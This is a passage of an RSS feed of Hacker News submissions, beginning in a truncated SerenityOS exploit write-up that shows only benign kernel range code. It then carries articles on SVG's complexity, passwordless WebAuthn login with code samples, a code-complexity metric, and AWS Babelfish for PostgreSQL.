    <span>auto</span> <span>remaining_parts</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>index</span><span>].</span><span>carve</span><span>(</span><span>range</span><span>);</span>
    <span>ASSERT</span><span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>&gt;=</span> <span>1</span><span>);</span>
    <span>m_available_ranges</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>remaining_parts</span><span>[</span><span>0</span><span>];</span>
    <span>if</span> <span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>==</span> <span>2</span><span>)</span>
        <span>m_available_ranges</span><span>.</span><span>insert</span><span>(</span><span>index</span> <span>+</span> <span>1</span><span>,</span> <span>move</span><span>(</span><span>remaining_parts</span><span>[</span><span>1</span><span>]));</span>
<span>}</span>

<span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>Range</span><span>::</span><span>carve</span><span>(</span><span>const</span> <span>Range</span><span>&amp;</span> <span>taken</span><span>)</span>
<span>{</span>
    <span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>parts</span><span>;</span>
    <span>if</span> <span>(</span><span>taken</span> <span>==</span> <span>*</span><span>this</span><span>)</span>
        <span>return</span> <span>{};</span>
    <span>if</span> <span>(</span><span>taken</span><span>.</span><span>base</span><span>()</span> <span>&gt;</span> <span>base</span><span>())</span>
        <span>parts</span><span>.</span><span>append</span><span>({</span> <span>base</span><span>(),</span> <span>taken</span><span>.</span><span>base</span>…</code></pre></div></div></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</a></em></p>]]>
            </description>
            <link>https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26115141</guid>
            <pubDate>Fri, 12 Feb 2021 16:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SVG: The Good, the Bad and the Ugly]]>
            </title>
            <description>
<![CDATA[
Score 200 | Comments 191 (<a href="https://news.ycombinator.com/item?id=26114863">thread link</a>) | @davebloggt
<br/>
February 12, 2021 | https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                        SVG, short for <em>“scalable vector graphics”</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.
                    </p><div id="article">
                <!-- Body -->
<figure>
<img src="https://www.eisfunke.com/res/article/svg-logo.svg" alt=""><figcaption>The SVG logo.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></figcaption>
</figure>
<p><a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG</a>, short for <em>“scalable vector graphics”</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.</p>
<p>I’ve been using SVG together with Inkscape regularly for a few years for sketches and graphics, and like to write it by hand to satisfy my love for precision and art through code. SVG and I have a kind of love-hate relationship. It’s powerful and has some nice free and open-source tooling, but the format itself is pretty ugly.</p>
<h2 id="the-good">The Good</h2>
<ul>
<li><p>It’s <em>the</em> format for vector graphics. It is well supported by a range of programs from Adobe Illustrator to Inkscape for editing and in various browsers.</p></li>
<li><p>It’s a web standard so you can use it directly in websites. You can also use CSS with it.</p></li>
<li><p>It’s XML-based, so the syntax is familiar, it’s extensible and can benefit from the vast XML ecosystem. For example, using <a href="https://en.wikipedia.org/wiki/XLink">XLink</a> you can reference other elements and definitions in an SVG file. Or <a href="https://inkscape.org/">Inkscape</a> uses custom XML tags to extend SVG into their editor exchange format.</p></li>
<li><p>It’s powerful. You can do <em>a lot</em> with it. It obviously supports various path types and shapes, supports text and more, but also animations, gradients, effects and more.</p></li>
</ul>
<h2 id="the-bad">The Bad</h2>
<p>It’s a web standard. And as is customary for a web standard, SVG is magnificiently bloated. The <a href="https://www.w3.org/TR/SVG11/REC-SVG11-20110816.pdf">SVG specification</a> brings a whopping 826 (<em>eight-hundred twenty-six</em>) pages to the table. And as if that’s not enough, it’s also XML-based and cross-linked with other web standards, driving the scope of any implementation to dizzying heights.</p>
<p>If you want to be sure to correctly render all SVG files, not only do you have to consider 800 pages of SVG spec, but e.g.&nbsp;another 20 pages of <a href="https://www.w3.org/TR/xlink11/">XLink spec</a>. Oh, and CSS as well, by the way. And, I shit you not, <em>JAVASCRIPT</em>. Yes. <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script">SVG files can include <code>&lt;script&gt;</code> tags.</a></p>
<p>SVG fits right in with web browsers. They’re hilariously bloated already, they already implement stuff like CSS and JavaScript that a complete SVG implementation requires. This problem of SVG is actually just the <a href="https://drewdevault.com/2020/03/18/Reckless-limitless-scope.html">problem of the web in general</a>. It’s scope is huge, it’s bloated and hard to work with.</p>
<p>SVG is nothing you could implement in a day. Or a week. Or a month. The huge amount of specifications, that are most often only partly implemented, makes it very hard to overview what supports what, confusing the user as to what features they can actually use if they want their SVG file to be universally supported.</p>
<p>Furthermore the XML-based syntax is pretty ugly and needlessly verbose. It’s tiring to write by hand and just as tiring to parse or generate automatically.</p>
<h2 id="the-ugly">The Ugly</h2>
<p>A central problem that can be extracted from the points listed above is the one I detailed in my article about <a href="https://www.eisfunke.com/article/language-design-machine-or-human.html">language design for machines vs.&nbsp;humans</a>: SVG doesn’t know what it wants to be, a machine-focused language or a human-focused language and ends up doing badly in both aspects.</p>
<p>Is it a machine-processible language? It’s far too bloated for that. Writing parsers, renderers and generators for SVGs is a huge task. The syntax is repetitive and complex. It has a lot of features that could be represented by more basic features.</p>
<p>But is it a format well-suited for direct usage by humans? Well, no. Firstly, the exhausting syntax and complexity is also bad for human users. Secondly, it misses a lot of features that would make it suitable for direct use. A graphics language that is meant for direct human use would be <a href="http://texdoc.net/pkg/tikz">Ti<em>k</em>Z</a> for LaTeX. While it’s not a great language regarding user experience in my opinion, it is definitely meant for humans and has the necessary features to help making creating complex graphics easy. But nobody would have the idea to use Ti<em>k</em>Z code as an interchange format for the finished graphic. Nobody would want to implement 1300 pages of Ti<em>k</em>Z manual just to view some graphic. Instead you compile it into an PDF (which is also a horrible format and badly bloated, but well). If SVG was a language meant for human use, compiling it into a machine-focused format would be the way to go as well, but as I said – it isn’t. It’s neither.</p>
<h2 id="what-now">What now?</h2>
<p>A good idea would be to develop a simple vector graphics exchange format that is desigend to be easily processed by machines. As minimal in features as possible. Maybe JSON-based, definitely not XML-based. You should be able to implement a basic renderer in a few days, or even better, hours, without depending on two metric tons of XML ecosystem libraries. Bezier curves, elliptic curves, fills, outlines and gradients should mostly suffice to represent every unanimated SVG. An extension could allow animations in a separate file extension.</p>
<p>This minimal and well-delimited format could then have a strict test suite and be implemented in browsers and image viewers with relative ease. Users could rely on their graphic working everywhere and implementers wouldn’t have to worry about implementing XLink, CSS and JavaScript as well. It could save bandwidth and computation power. Compilers from and to SVG could be written for compatibility.</p>
<p>It could be used as export format of user-facing programs like Inkscape or Adobe Illustrator. For people wanting to markup graphics through code there’s already stuff like Ti<em>k</em>Z, <a href="https://diagrams.github.io/">Haskell diagrams</a> or <a href="https://matplotlib.org/stable/index.html">Python matplotlib</a> that could also export to the new minimal interchange format.</p>
<p>I’m actually thinking about making a slim machine-focused vector graphics format (the name <em>“SlimSVG”</em> has been suggested :D) and writing my own human-focused Haskell graphics creation library with similar goals for my own purposes in the future, maybe as a student research project for the university.</p>
<p>In summary: Decide whether a language is for humans or for machines and do one of those things. And do the one thing well instead of both, but badly.</p>
<hr>
<p><strong>Update 1:</strong> This article was posted on <a href="https://news.ycombinator.com/item?id=26114863">Hacker News</a> and landed on the front page, currently it’s on rank 3. I’m honored! <a href="https://news.ycombinator.com/reply?id=26115086&amp;goto=item%3Fid%3D26114863%2326115086">In the comments there</a> somebody mentioned an <a href="https://www.xul.fr/svgtetris.svg">interesting use of the <code>&lt;script&gt;</code> tag in SVG</a>. I’m unsure though whether I should be impressed or horrified :D</p>
<p><strong>Update 2:</strong> Somebody posted this on <a href="https://www.reddit.com/r/programming/comments/livw57/svg_the_good_the_bad_and_the_ugly">Reddit</a> as well. Currently, there are over 150 comments, wow.</p>
<p><strong>Update 3:</strong> PEOPLE, PLEASE. This is absolutely not about “XML is bad, let’s do JSON instead”. I actually like XML more than JSON in total, I’m a fan of XML schema and nice strong schemas. And while I still don’t like the syntax, XML generally is a good fit for a document markup language like HTML. I mostly wouldn’t care whether a good format with a good data model was encoded in JSON, XML, YAML, binary, Brainfuck or monkey feces. The encoding really is the least important part. I just think that for a strictly machine-focused format for data JSON would be a better choice.</p>
<p>I guess though I should have anticipated that saying that I don’t like XML and then mentioning the word “JSON” would start a religious war.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn1" role="doc-endnote"><p><a href="https://commons.wikimedia.org/wiki/File:SVG_logo.svg">Image source</a>, licensed under CC-BY-SA-4.0<a href="#fnref1" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
                <!-- /Body -->
            </div></div>]]>
            </description>
            <link>https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114863</guid>
            <pubDate>Fri, 12 Feb 2021 15:43:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Effortless Security on the Web]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26114546">thread link</a>) | @mooreds
<br/>
February 12, 2021 | https://engineering.q42.nl/passwordless-authentication/ | <a href="https://web.archive.org/web/*/https://engineering.q42.nl/passwordless-authentication/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Wouldn’t it be amazing if you could sign up with a website with face recognition on your mobile phone and the next day on your MacBook you could just use your fingerprint scanner to sign in? What if we told you that this is possible today? </p><p>Currently you manage your accounts using passwords that you have to remember. For most users this is done by either remembering various different passwords, or worse; using the same one for every website. While social login has brought us a convenient way to sign in to websites using a single account, it still requires an account with a password. On top of that, there are security and privacy risks when using a single account for each service. Extra layers of security, like two factor authentication, can be added. But those come at the cost of complexity for the end user. The problem lies in passwords themselves. To solve it we should, and finally can, get rid of them all together to provide a user-friendly and secure authentication flow. </p><p>Even though it is still early and it has not landed in all browsers, we feel this is the future. We have already looked into what it takes to implement. As with any form of authentication, it is definitely not a trivial subject and it requires effort to implement. But please bear with us though, as we talk you through the steps. The result for the end user is definitely worth it.</p><p>Passwordless authentication on the web is made possible by the new Web Authentication (WebAuthn) API. If you’re not familiar with this API, you can check out <a href="https://webauthn.guide/#about-webauthn">this guide</a> or the video below to make it all a bit more tangible.</p><figure><iframe width="480" height="270" src="https://www.youtube.com/embed/hk7kDRx3MuQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>The simplicity of using WebAuthn</figcaption></figure><h3 id="connecting-devices">Connecting devices</h3><p>The WebAuthn API supports replacing passwords with biometric data through device specific authenticators. These authenticators are, for example, the facial recognition &amp; fingerprint scanners built into (mobile) devices.</p><p>Creating accounts and logging in with a device-specific authenticator has one problem. The fingerprint scanner on a mobile phone isn’t connected to the one on a laptop. So, how does a user access their account on a laptop if they created the account on a mobile phone? </p><p>For multi-device passwordless authentication we created a proof-of-concept flow. Our solution uses a secure environment already shared on all devices: email. A secure link sent through email connects the laptop &amp; mobile phone. No typing required at all. Let’s explore this flow together.</p><h3 id="under-the-hood">Under the hood</h3><p>For most server side languages, there’s a library available that does the heavy lifting around WebAuthn by implementing FIDO2. We went with <a href="https://github.com/abergs/fido2-net-lib">abergs/fido2-net-lib</a> on .NET core. The juicy part is in expanding the user interaction flow. Let’s start with registration. </p><p>A user enters a desired username (a valid email in our case), presses the register button and is presented with a biometric confirmation modal to resolve a generated challenge that is sent by the server. When the user successfully authenticates with their biometric info, an account is created for that user.</p><p>During account creation, these steps are executed:</p><ol><li>Server sends challenge</li><li>Device requests biometric confirmation</li><li>User scans finger</li><li>Device creates public + private key</li><li>Device sends public key as response</li><li>Server creates user account associated to that public key</li></ol><p>When a user later wants to login to the website, they enter their username (email) again and then are presented with a biometric confirmation modal to resolve a generated challenge. This time the server checks if the response (that the browser generates based on the given challenge and private key) matches the user with the given email address. If that’s the case, the user is logged in.</p><p>During user login, these steps are executed:</p><ol><li>Server sends challenge</li><li>Device requests biometric confirmation</li><li>User scans finger</li><li>Device signs challenge with private key</li><li>Device sends response to server</li><li>Server verifies response with public key</li></ol><p>On a technical level this is not too different compared to a regular password login, if you would hash and salt the password before sending it over. The biggest difference is we’re not asking the user to authenticate with something that needs to be remembered.</p><h3 id="implementing-multi-device-sign-in">Implementing multi-device sign-in</h3><p>Logging in with a platform authenticator only works if the local device has credentials stored for this website. The first step in making multi-device possible is by detecting if the device has credentials for the current website user account or not. If it doesn’t, the Web Authentication API will throw an error. This allows us to ask the user if they want to add this device to their account.</p><figure><pre><code>let credentials;
try {
  credentials = await navigator.credentials.get(optionsObject);
} catch (err) {
  // Show modal to ask if the user wants to add this device to their account
  confirmAddDevice();
}</code></pre><figcaption>Detect if the device platform authenticator has known credentials</figcaption></figure><p>This is the hook that allows us to extend the user experience. For our take on a possible UX flow for passwordless multi-device authentication we came up with the diagram below. Highlighted in blue is the email confirmation flow that we found missing in existing implementations of logging in without a password. Remember that, while this diagram may seem daunting at first, all the parts in black are taken care of by WebAuthn and the FIDO2 library. Luckily that also is the hardest and most boring part.</p><figure><img src="https://lh3.googleusercontent.com/vwtyGrDkcChPhUrxucOV-6IbyzezykWKK-NI_KEF4px3Ke-uGunrfKZXd34gd0z5R0tfd1-xEiidbgTCVbKK09qdhKiW6ezDYaUg_keR61DoGJmJR1Xs4vXokVCnSzWAD2fSwFFG"><figcaption>Expand the platform authenticator flow to support multiple devices</figcaption></figure><p>Our flow starts when the user wants to sign in to their existing account from an unknown device. The flow starts similar to the regular login flow. However, we can now detect when the device has no credentials stored for this website.</p><p>Interaction wise this is where things get interesting. We can let the user know that this is an unknown account that is being attempted to sign in to. But just showing an error is a dead path. A user expects an immediate follow-up action to add this device to the account.</p><p>In our case we show a modal to ask the user if they want to add the new device:</p><figure><pre><code>async function confirmAddDevice() {
  const confirm = confirm('Do you want to add this device to your account?');
  if (!confirm) {
    // User denied the confirm modal, do nothing
    return;
  }

  try {
    await fetch('/api/add-device', {
      method: 'POST',
      body: {
        email: this.email
      }
    });

    alert('Email sent, click the link in the mail to continue the process.')
  } catch {
    alert('Could not send an email, please try again later.')
  }
}</code></pre><figcaption>Ask the user if they want to add the device to their account</figcaption></figure><p>When the user confirms the action, the client sends a request to the server. Luckily we know how to securely contact the user because they registered with their email as username. The server then sends an email that allows the user to register their device.</p><figure><pre><code>[HttpPost]
[Route("/add-device")]
public async Task&lt;JsonResult&gt; AddDevice([FromBody] string email)
{
  var user = Storage.GetUser(email);
  if(user == null) {
    return NotFound();
  }

  var otp = Storage.GenerateAndStoreOneTimePasswordForUser(user);

  var response = await SendAddDeviceEmail(user, otp);
  return Json(response);
}</code></pre><figcaption>Send an email to the user</figcaption></figure><p>By clicking the link in the email, the user confirms this device may be added to their account. The flow is just like with the first device, only adding a one time password (OTP) in the form of a link in an email. The OTP allows the new device to be securely linked to the existing account. This is done by the server, which checks if the OTP matches the one generated for the user, and stores the challenge response as an additional device linked to the account.</p><p>This way, minimal user input is required to allow multi-device passwordless authentication on the web. On top of that, we leverage existing patterns for account validation (through email) that users are already used to on the web.</p><h3 id="outro">Outro</h3><p>We are very excited to work towards a more secure and effortless web, and can’t wait to use this in production. What’s your opinion on passwordless authentication, and how should multi-device usage be addressed? We would love to hear your ideas and get to know your implementations.</p><hr><p><em>Do you love figuring out new features like multi-device passwordless authentication? Then please do check our job vacancies (in Dutch) at <a href="https://werkenbij.q42.nl/">https://werkenbij.q42.nl</a>!</em></p>
                </div>
            </section></div>]]>
            </description>
            <link>https://engineering.q42.nl/passwordless-authentication/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114546</guid>
            <pubDate>Fri, 12 Feb 2021 15:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For the Love of All That's Holy, Use CCL to Control Complexity in Your Systems]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26114364">thread link</a>) | @brobdingnagians
<br/>
February 12, 2021 | https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="post-body">
        <p>&lt;rant&gt;Two years ago I sat in on a security meeting. The subject was protecting the code and associated websites from attack.</p><p>"I'd just attack the npm packaging system, introducing subtle changes in several that would work together to do whatever I wanted."</p><p>All I got was blank stares, and this was from professionals. From <a href="https://www.bleepingcomputer.com/news/security/researcher-hacks-over-35-tech-firms-in-novel-supply-chain-attack">this week's reading</a>:</p><blockquote>Unlike <a href="https://www.bleepingcomputer.com/news/security/malicious-npm-project-steals-discord-accounts-browser-info/">traditional typosquatting attacks</a> that rely on social engineering tactics or the victim misspelling a package name, this particular supply chain attack is more sophisticated as it needed no action by the victim, who automatically received the malicious packages.<p>This is because the attack leveraged a unique design flaw of the open-source ecosystems called <strong>dependency confusion.</strong></p></blockquote><p>Even using things like Test-Driven Development, programmers can only reason about a small part of the code in front of him in the IDE. (In fact, one of the reasons TDD is so successful is because programmers have no idea at how much they suck at actually understanding what they're doing).</p><p>From a recent study:</p><figure><img src="https://danielbmarkham.com/content/images/2021/02/EsXlJyCXYAAD9x7.png" alt="" srcset="https://danielbmarkham.com/content/images/size/w600/2021/02/EsXlJyCXYAAD9x7.png 600w, https://danielbmarkham.com/content/images/size/w1000/2021/02/EsXlJyCXYAAD9x7.png 1000w, https://danielbmarkham.com/content/images/size/w1600/2021/02/EsXlJyCXYAAD9x7.png 1600w, https://danielbmarkham.com/content/images/2021/02/EsXlJyCXYAAD9x7.png 1890w" sizes="(min-width: 720px) 720px"></figure><p>Here's the takeaway graphic:</p><figure><img src="https://danielbmarkham.com/content/images/2021/02/2021-02-11_9-41-46.jpg" alt="" srcset="https://danielbmarkham.com/content/images/size/w600/2021/02/2021-02-11_9-41-46.jpg 600w, https://danielbmarkham.com/content/images/2021/02/2021-02-11_9-41-46.jpg 678w"></figure><p>Note: this result is seeking out a mean, regular coders writing regular code. Your mileage may vary.</p><p>Why is this? Let's take two code samples:</p><!--kg-card-begin: markdown--><pre><code>echo Hello World
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>#include &lt;cstdio&gt;

int main()
{
    printf("hello from %s!\n", "HelloWorld");
    return 0;
}
</code></pre>
<!--kg-card-end: markdown--><p>In the first example, how many symbols is the programmer manipulating to reach their goal? Only one, "echo" In the second example, how many symbols are being manipulated?</p><p>I counted seven, but I wasn't trying to be strict.</p><p>What do these seven involve? There's namespaces, libraries, standard function signatures, string substitution, OS return values, and so on.</p><p>Do any of these matter to the new C# programmer? Of course not! That's why it's called "Hello World". You're supposed to be able to type in a few symbols and start doing something useful right away.</p><p>The waters get murky very quickly after that. Let's say your boss sends you an email:</p><p>"Jenkins, add the cover sheet to all of those TPS reports"</p><p>Something goes wrong. The boss is unhappy. You two have a conversation about what you did that was mistaken.</p><p>Suppose instead you're looking at the following code:</p><!--kg-card-begin: markdown--><pre><code>WorkingStack.Reports.AddSheet(cover);
</code></pre>
<!--kg-card-end: markdown--><p>The boss is mad because it's not working right.</p><p>You can certainly go into the boss's office and have that same conversation, just this time over code instead of an email. <em>In fact, that's what you have to do</em>. Without a bunch more source code, what the hell does that C# code do, anyway? You don't know. It says it does the same thing as the boss wanted, but for all you know it's mailing off your tax returns to Russian hackers.</p><p>Most of modern programming is spent creating and consuming fake abstractions that are much more leaky and buggy than we'd like admit. In fact, it's grown far, far beyond our ability to reason about. It's magic. We spend a lot of time pretending that this isn't the case, then cursing when reality rears its ugly head again.</p><p>When I was writing <a href="https://leanpub.com/info-ops2">my second book</a>, I had to address this problem because reasoning about code and controlling complexity is the number one problem in software development today. It's the reason we have buildings full of hundreds of developers wasting a lot of time and money. Our incentives are wrong.</p><p>The best thing to look for in any professional, doctor, lawyer, coder, etc is their ability to not engage with a problem, instead solving it in a simple and non-intrusive way. The worst behavior from professionals are the folks who are going to do a lot of work no matter what. These guys look busy, and they’re deep in a bunch of technically wonky stuff that nobody understands, so naturally they look like they know what they’re doing and are doing a good job. The guy who shows up in flip-flops and after a five-minute conversation solves your problem? He’s just some smart eleck showman, probably a con man.</p><p>We don’t teach coders the one skill they need most of all: adding incremental complexity as-needed. Nobody talks about choosing what to add and why. Nobody talks about ways to understand you’ve gone too far (except for a few folks like me. Apologies for the shameless plug.)</p><p>For some odd reason, discussions on frameworks and complexity always devolve into some version of “Dang kids!” vs. “Talentless luddite!” As many people have pointed out, not only do we not teach or talk about incremental complexity, if you don’t have the appropriate buzzwords in your CV, you don’t get hired. So BigCorps naturally end up with scads of people who did well on scads of tech that somebody decide they had to use/learn but nobody very good at actually making things happen.</p><p>This can't continue, and I want to do my part in making it end. The answer I came up is something I call it <strong>Code Cognitive Load (CCL)</strong>. It's the amount of risk you take on as a programmer looking at any piece of code to manipulate it, whether coding fresh or doing maintenance on existing code.</p><ol><li>It's scoped first by method/function and then by compilation unit. There's no other scoping (namespace, class, module, etc.)</li><li>To compute, you add up four things: symbols you are required to look at to do your work, exceptions that using those symbols may throw, &nbsp;any editable code underneath that you may have to read or write for those symbols to work, and exceptions that code may throw</li></ol><p>You can see for the first Hello World example, there's only one symbol, echo, and there's only one general type of exception, and that's related to system resources. For the second example, the count easily goes into the dozens.</p><p>Why is this related to the security problem I led off with? Because if you have code you can't reason about, you don't just have a risk for bugs, it's a security risk too. The code doesn't care whether it's busy screwing up your beautiful solution or hacking your local network. You can't reason about it. Period. That's the problem. It's doing whatever it's coded to do.</p><p>Do npm packages count as "editable code underneath that I have to read or write for these symbols to work"? Sure, if you're downloading code and compiling it, you may have to edit it. It's a risk. If you're just hotlinking to a dll or something, that's different. If you're using precompiled code, whatever you've got, you've got. It may be buggy as hell and it may do nasty things that make you sad and drink by yourself late at night, but it's not a complexity issue, it's some other kind of issue, security, performance, and so on. Don't confuse them. You address and work with the problems of that precompiled library in a totally different way than you would with code you may one day have to plow through.</p><p>Code Cogntivie Load (CCL) is not a good/bad metric. It's a measure of the risk in complexity you're assuming to do whatever work you have to do. Some problems may naturally require a great deal of complexity risk. Others not so much. That's your call, not mine.</p><p>The point is that you're measuring it, instead of just ignoring it until something goes wrong. Is your solution doing mostly the same thing but your CCL is going through the roof? You're most likely doing something wrong, since your code's value is staying the same while your coding risk is dramatically increasing. </p><p>There's no way of knowing whether code is appropriately complex or not, but we can (and should) measure how much <em>complexity risk</em> we're taking on ourselves and our downstream maintenance workers.</p><p>This will change the way you code and the way you think about coding. Good. Looking at the software landscape today, things need changing.</p><p>&lt;/rant&gt;</p>    </div>
</div></div>]]>
            </description>
            <link>https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114364</guid>
            <pubDate>Fri, 12 Feb 2021 15:04:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Babelfish: The Elephant in the PostgreSQL Room?]]>
            </title>
            <description>
<![CDATA[
Score 172 | Comments 134 (<a href="https://news.ycombinator.com/item?id=26114281">thread link</a>) | @ahachete
<br/>
February 12, 2021 | https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/ | <a href="https://web.archive.org/web/*/https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <div>
                
                <div>
                    <p>On December 1st, 2020, <a href="https://aws.amazon.com/blogs/opensource/want-more-postgresql-you-just-might-like-babelfish/">Amazon AWS announced Babelfish</a>. Babelfish “<em>adds an endpoint to PostgreSQL that understands the SQL Server wire protocol Tabular Data Stream (TDS), as well as commonly used T-SQL commands used by SQL Server. Support for T-SQL includes elements such as the SQL dialect, cursors, catalog views, data types, triggers, stored procedures, and functions</em>”. Wow. <strong>SQL Server wire and application compatibility for PostgreSQL!</strong></p>
<p>What this means is that Babelfish will be able to “impersonate” a SQL Server database. Applications may be able to run unchanged, believing that they are connecting to SQL Server, when they will actually be connecting to PostgreSQL-Babelfish.</p>
<p>Surely, compatibility will not be 100% at the beginning. But it will keep improving, and <strong>as long as it provides enough compatibility for a nice set of applications to run unchanged on Babelfish, it will open the door to migrations and replacing SQL Servers with Babelfish</strong>. This is very good news for the PostgreSQL Community!</p>
<h2 id="brief-analysis-on-postgresql-popularity">Brief analysis on PostgreSQL popularity</h2>
<p><a href="https://db-engines.com/en/blog_post/85">PostgreSQL has been named (again) database of the year 2020</a>. This award is given based on “<em>DBMSs sorted by how much they managed to increase their popularity in 2020</em>”, which means that <strong>PostgreSQL was the database that grew the most in popularity in 2020</strong>. <strong>But in absolute terms, PostgreSQL’s popularity is still way behind that of Oracle, MySQL and SQL Server</strong>. Let’s analyze <a href="https://db-engines.com/en/ranking_trend">db-engines popularity trend chart</a> for the Top4 DBMS, on a linear scale (db-engines presents results on a logarithmic scale):</p>
<p><img src="https://postgresql.fund/img/dbengines_popularity_ranking-linear-900.png" alt="DB-engines popularity ranking - linear scale"></p>
<p>The trends for the last 8 years are clear: Oracle and SQL Server are constantly declining in popularity; MySQL is slightly declining; and PostgreSQL is clearly growing in popularity. But while PostgreSQL almost tripled in popularity in these eight years, it is still far behind the other three.</p>
<p>PostgreSQL became the database of 2020 because its popularity grew the most in the last year. The other three mentioned databases declined in popularity during 2020. If we assume the same rate of change in popularity will continue for the upcoming years, by 2025 PostgreSQL would still remain in the 4th place, albeit close to SQL Server. It won’t overtake SQL Server until 2026, and by 2030 PostgreSQL would still lag behind Oracle and MySQL.</p>
<table>
<thead>
<tr>
<th></th>
<th>Jan 21</th>
<th>+/- Jan 20</th>
<th>Est. 2025</th>
<th>Est. 2030</th>
</tr>
</thead>
<tbody>
<tr>
<td><em>Oracle</em></td>
<td>1,317</td>
<td>-28</td>
<td>1,204</td>
<td>1,064</td>
</tr>
<tr>
<td><em>MySQL</em></td>
<td>1,243</td>
<td>-24</td>
<td>1,146</td>
<td>1,025</td>
</tr>
<tr>
<td><em>Microsoft SQL Server</em></td>
<td>1,023</td>
<td>-71</td>
<td>740</td>
<td>386</td>
</tr>
<tr>
<td><em>PostgreSQL</em></td>
<td>551</td>
<td>44</td>
<td>727</td>
<td>947</td>
</tr>
</tbody>
</table>
<p>How is this analysis related to Babelfish? <strong>Babelfish opens the door to new users, new markets, new opportunities. <strong>Babelfish may bump PostgreSQL’s popularity further, targeting use cases that either PostgreSQL is not able to reach today; or can only reach via complex technology migrations.</strong> Babelfish could be one of the many potential boosts that PostgreSQL needs in order to become a more universally used database</strong>.</p>
<h2 id="to-fork-or-not-to-fork-thats-the-question">To fork, or not to fork, that’s the question</h2>
<p>In their announcement, AWS said that “<em>We are open sourcing Babelfish in 2021. […] We are releasing Babelfish under the Apache 2.0 license. We invite others to become active in the project, and we will see it as a sign of success when developers outside of AWS become committers or maintainers. You can help by adding or extending Babelfish functionality, submitting feature requests, working on documentation, and contributing test cases</em>”. They also mentioned the code will be published on GitHub.</p>
<p><strong>At the time Babelfish will be published, it will likely require changes to PostgreSQL to enable Babelfish to be an extension</strong>. Some people may call that a “fork” of PostgreSQL, and others may call it a “development branch”. The difference between the two will only be clear over time. Note that PostgreSQL development model doesn’t use feature branches, and in my opinion it’s a great model –but this is an entirely different topic. It is really appreciated that AWS is releasing the code as open source, and under a permissive license (that should be compatible with PostgreSQL’s). <strong>If AWS developers work with the PostgreSQL Community to get the necessary changes merged into PostgreSQL core, then it would have been a development branch, and not a fork. This is something that the PostgreSQL Community and all parties involved need to figure out</strong>.</p>
<p>On January 25th, Amazon AWS made a first move. In an <a href="https://www.postgresql.org/message-id/CAGBW59d5SjLyJLt-jwNv%2BoP6esbD8SCB%3D%3D%3D11WVe5%3DdOHLQ5wQ%40mail.gmail.com">email to PostgreSQL’s hackers mailing list</a>, Jan Wieck, a well-known Postgres-er, proposed to start discussing the implementation of protocol hooks. These hooks would enable to implement SQL Server’s protocol as an extension, rather than a fork.</p>
<p>Protocol hooks are, possibly, not the only hooks or modifications to PostgreSQL core that would be required to integrate the whole Babelfish project. With those changes to the core most of the Babelfish code could possibly be integrated in core as an extension(s). I cannot estimate the complexity of these core changes. But I believe that it would be a worthwhile effort, an effort that may further increase PostgreSQL outreach.</p>
